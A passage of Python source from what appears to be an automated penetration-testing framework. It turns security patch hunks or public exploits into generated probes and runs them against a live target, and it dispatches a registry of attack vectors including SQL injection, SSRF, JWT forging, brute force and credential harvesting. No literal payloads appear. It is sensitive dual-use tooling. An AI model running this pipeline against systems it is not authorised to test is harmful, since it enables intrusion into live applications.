        plan = _pd.plan(component, version, base_url=base or None,
                        host_header=os.environ.get("AEGIS_HOST_HEADER"), confirm=bool(base))
    except Exception as e:
        return {"status": 200, "body": f"[patch_diff] plan failed: {e}",
                "patch_diff": {"component": component, "version": version, "mode": "error"}}
    mode = plan.get("mode")
    if mode == "patch_diff":
        hunks = plan.get("security_hunks") or []
        hblob = "\n\n".join("// %s (signals: %s)\n%s" % (h.get("filename", ""), ",".join(h.get("signals", [])),
                                                         h.get("hunk", "")) for h in hunks[:6])
        brief = ("REVERSE-ENGINEER THE PATCH. Below are the SECURITY-relevant hunks of the fix that landed "
                 "between the vulnerable and patched releases of %s %s -- the fix reveals the bug. Write ONE "
                 "NON-DESTRUCTIVE probe (curl or python) that triggers the PRE-patch (vulnerable) behaviour on "
                 "the live app, with an ORACLE that proves it. Base: %s.\nPATCH HUNKS:\n%s"
                 % (component, version, base, hblob))
    elif mode == "public_exploit":
        brief = ("A public exploit targets %s %s (or newer): %s. ADAPT it into ONE NON-DESTRUCTIVE probe "
                 "against %s with an ORACLE that proves exploitability without causing damage."
                 % (component, version, _j.dumps(plan.get("public_exploits"))[:700], base))
    else:                                                      # novel / behavioral
        brief = ((plan.get("note") or "novel-code direction") +
                 " Write ONE non-destructive probe (curl/python) against %s with a proving ORACLE." % base)
    # LIVE ADVISORY RESEARCH (the approach is normally STATED publicly): prepend the advisory grounding so the
    # bench develops from the publicly-stated approach + the diff, not a guess. Offline-safe (empty if offline/
    # nothing relevant); authorized-OSINT lane, same gating as the RAG online refresh.
    try:
        import cve_research as _cr
        _adv = _cr.grounding_brief(component, version)
        if _adv:
            brief = _adv + "\n\n" + brief
            plan["advisories_used"] = True
    except Exception:
        pass
    move2 = dict(move, new_code=brief, layer="code", action="probe",
                 technique="patch_diff.%s" % component, vuln_class=move.get("vuln_class") or "n-day",
                 why_novel="grounded %s probe for %s %s" % (mode, component, version))
    try:
        import novel_code
        move2 = novel_code.make_code_writer()(move2, ctx) or move2    # fills move2["code"] from the code bench
    except Exception as e:
        return {"status": 200, "body": "[patch_diff] code-bench unavailable: %s" % str(e)[:120],
                "patch_diff": {"component": component, "version": version, "mode": mode,
                               "repo": plan.get("repo"), "note": (plan.get("note") or "")[:200]}}
    res = probe(move2, ctx)                                    # run the written probe + its probe_verified oracle
    res["patch_diff"] = {"component": component, "version": version, "mode": mode, "repo": plan.get("repo"),
                         "hunks": len(plan.get("security_hunks") or []), "note": (plan.get("note") or "")[:200]}
    return res


LEGS = {"web": web, "fact": web, "authz": web, "money": web, "stateful": stateful, "differential": differential,
        "idor": idor, "rate": rate, "security_headers": security_headers, "session_fixation": session_fixation,
        "open_redirect": open_redirect, "mass_assign": mass_assign, "csrf": csrf, "ssrf": ssrf, "xss": xss, "file_upload": file_upload,
        "field_leak": field_leak, "nested_write": nested_write, "filter_injection": filter_injection, "sql_raw": sql_raw,
        "zap": zap,
        "recon": recon, "supply_chain": supply_chain, "static": static,
        "fuzz": fuzz, "ossfuzz": ossfuzz, "nuclei": nuclei, "msf": msf, "misconfig": misconfig, "rag": rag,
        "probe": probe, "code": probe,
        "jwt": jwt_leg, "jwt_forge": jwt_leg, "broken_auth_jwt": jwt_leg,
        "patch_diff": patch_diff_leg, "ndiff": patch_diff_leg, "n_day": patch_diff_leg}

# DISCOVERY-PARITY legs (AD/LDAP, cloud, fingerprint, external-surface, cred-harvest, sbom) + the NOVEL
# beyond-tooling techniques (rag_infer, authz_fuzz, depconf, honeypot, attackpath). Offline-safe: if the
# module can't import, the core vectors above still work unchanged.
try:
    import discovery as _discovery
    LEGS.update(_discovery.LEGS)
except Exception:
    _discovery = None

# D8: the front-door battery (BruteForceFeasibility / UserEnumeration / PinPolicy) as a loop vector.
try:
    import frontdoor as _frontdoor
    LEGS.update(_frontdoor.LEGS)
except Exception:
    _frontdoor = None

# #5: injection battery (SSTI / cmdi-OOB / time-blind) on X's canary/timing/arithmetic-marker forms.
try:
    import injection as _injection
    LEGS.update(_injection.LEGS)
except Exception:
    _injection = None


def vector_names():
    return sorted(set(LEGS) - {"fact", "authz", "money", "web"} | {"web"})


_SURFACE_LIVE = {}
_REALITY_ACTIONS = ("web", "authz", "authz_fuzz", "sql_raw", "idor", "nested_write", "field_leak",
                    "filter_injection", "open_redirect", "ssti")


_SURFACE_BASELINE = {}


def _reality_sess(ctx):
    import requests as _rq
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr("owner") if sfr else _rq.Session()
    try: sess.verify = False
    except Exception: pass
    return sess


def _soft404_baseline(base, ctx):
    """Fingerprint the target's response to a DEFINITELY-nonexistent path -> (status, body_len). Apps (esp.
    WordPress) serve a themed 404 as 200/redirect, so a raw status check passes everything; we compare each
    surface to THIS baseline instead. Cached per base."""
    if base in _SURFACE_BASELINE:
        return _SURFACE_BASELINE[base]
    bl = None
    try:                                                   # follow redirects so a soft-404 lands on its FINAL
        r = _reality_sess(ctx).get(base.rstrip("/") + "/aegis-nonexistent-%d-zqx" % os.getpid(),
                                   timeout=8, allow_redirects=True)   # page (home/themed 404), not the 301 hop
        bl = (r.status_code, len(r.content or b""))
    except Exception:
        bl = (404, 0)
    _SURFACE_BASELINE[base] = bl
    return bl


def _surface_live(base, surface, ctx):
    """REALITY GATE core: does this surface actually exist? Compares the surface's response to a known-
    nonexistent baseline (soft-404 aware). True=probe it, False=matches the 404 baseline -> skip.
    Fail-open on error. Cached per (base, surface)."""
    surf = str(surface or "").split("?")[0]
    if not surf.startswith("/"):
        return True
    key = (base, surf)
    if key in _SURFACE_LIVE:
        return _SURFACE_LIVE[key]
    live = True
    try:
        b_status, b_len = _soft404_baseline(base, ctx)
        r = _reality_sess(ctx).get(base.rstrip("/") + surf, timeout=8, allow_redirects=True)
        rl = len(r.content or b"")
        if r.status_code in (404, 410):
            live = False
        elif r.status_code == b_status and b_len and abs(rl - b_len) <= max(96, int(b_len * 0.03)):
            live = False                                  # soft-404: lands on the same page as a nonexistent path
        else:
            live = True                                   # different from the 404 baseline -> it EXISTS
    except Exception:
        live = True
    _SURFACE_LIVE[key] = live
    return live


def dispatch(move, phase, ctx):
    """Run the vector for move['action'] (default web). Returns the leg result + the move."""
    move = _normalize_move(move, ctx)
    # REALITY GATE: do not spend budget probing a surface that does not exist. The board hallucinates
    # endpoints (/api/dependencies ...) when discovery is thin; a web-class move at a confirmed-404 surface
    # is skipped cheaply (counts as noise, not an information-gaining attempt) so budget flows to the REAL
    # crawl/wp_enum-confirmed surface. Gate AEGIS_REALITY_GATE=0.
    if str(os.environ.get("AEGIS_REALITY_GATE", "1")).lower() not in ("0", "false", "no", "off"):
        _surf = move.get("surface") or move.get("path")
        _base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or ""
        if move.get("action", "web") in _REALITY_ACTIONS and _surf and _base \
                and _surface_live(_base, _surf, ctx) is False:
            return {"status": 404, "move": move, "dead_surface": True,
                    "body": f"[reality-gate] surface {_surf} does not exist (404) -- skipped, no budget spent"}
    leg = LEGS.get(move.get("action", "web"), web)
    try:
        res = leg(move, ctx)
    except Exception as e:
        res = {"status": -1, "body": f"[error] {e}"}
    res["move"] = move
    # PASSIVE SECRETS/PII SCAN (commercial-parity): scan EVERY response body for high-confidence secret/
    # stack-trace leakage -- like a commercial scanner's passive pass over all traffic. Only a verified
    # (high-confidence) hit is attached, to stay quiet; the oracle records it as a SIDE finding without
    # changing the move's own verdict. Cheap regex; offline-safe; gate AEGIS_SECRETS_SCAN=0.
    if str(os.environ.get("AEGIS_SECRETS_SCAN", "1")).lower() not in ("0", "false", "no", "off"):
        try:
            body = res.get("body")
            if isinstance(body, str) and body:
                from verified_findings import SecretsOracle
                v, rc = SecretsOracle(body, surface=(move.get("surface") or move.get("path") or ""),
                                      status=res.get("status")).check()
                if v == "verified":
                    res["secrets_scan"] = rc
        except Exception:
            pass
    # attach a normalized probe view (garak-pattern uniform schema) under a SEPARATE key so every leg's
    # result reads the same way downstream. It must NOT overwrite result['probe'], which the probe leg
    # sets with the genuine code-probe payload (verdict/notes/code) + probe_verified -- clobbering it
    # both empties genuine-probe evidence AND makes the schema view shadow the HTTP/DB/authz oracles
    # (every non-probe move would look like an unproven probe). Offline-safe -> skipped if unimportable.
    try:
        import probe_schema
        res["probe_schema"] = probe_schema.normalize({**move, **res}).as_dict()
    except Exception:
        pass
    return res
